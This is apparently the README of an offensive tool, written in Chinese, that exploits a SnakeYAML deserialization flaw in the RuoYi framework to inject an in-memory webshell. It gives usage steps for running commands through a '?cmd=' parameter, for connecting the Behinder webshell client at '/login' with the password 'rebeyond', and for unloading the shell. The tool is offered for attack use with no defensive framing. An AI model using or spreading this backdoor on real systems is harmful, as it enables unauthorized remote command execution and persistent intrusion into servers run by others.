# yaml-payload-for-ruoyi
若依 snakeyaml 反序列化漏洞注入内存马
1. 直接执行命令：?cmd=whoami
2. 连接冰蝎：/login?cmd=1（cmd不为空即可），密码为rebeyond，使用冰蝎正常连接即可
3. 卸载内存马：?cmd=delete
